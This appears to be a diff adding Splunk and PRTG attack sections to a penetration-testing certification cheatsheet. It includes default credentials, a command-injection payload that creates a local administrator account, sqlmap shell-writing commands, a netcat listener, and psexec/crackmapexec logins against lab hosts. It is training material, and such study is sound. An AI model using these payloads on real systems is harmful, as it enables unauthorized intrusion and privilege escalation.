@@ -75,6 +75,8 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Hydra](#hydra)
 - [SQLMap](#sqlmap)
 - [Attacking Common Applications](#attacking-common-applications)
+  	- [Splunk](#splunk)
+  	- [PRTG](#prtg)
 - [Useful Resources](#useful-resources)
 
 
@@ -1912,6 +1914,7 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
 ## Attacking Common Applications
+### Splunk
 ```
 --> The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme
 --> The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication
@@ -1930,7 +1933,22 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 	https://10.129.201.50:8000/en-US/manager/search/apps/local
 --> Before uploading the malicious custom app, let's start a listener using Netcat or socat.
 	sword0x00@htb[/htb]$ sudo nc -lnvp 443
-
+```
+### PRTG
+```
+--> curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
+--> Default credentials prtgadmin:prtgadmin
+--> try brute force
+--> check CVEs for older versions
+--> check command injection via https://www.codewatch.org/blog/?p=453
+	--> Setup in the top right and then the Account Settings menu and finally click on Notifications.
+	--> Add new notification. -> next to EXECUTE PROGRAM. Under Program File, select Demo exe notification - outfile.ps1
+	--> in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add --> Save
+	--> Notifications -->  see our new notification named pwn in the list. --> After clicking Test we will get a pop-up that says EXE notification is queued up.
+	--> Since this is a blind command execution, we need check by crackmap or impacktools
+	--> sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
+	--> impacket-psexec APP03/prtgadm1:'Pwn3d_by_PRTG!'@10.129.201.50
+	
 ```
 ## Useful Resources
 
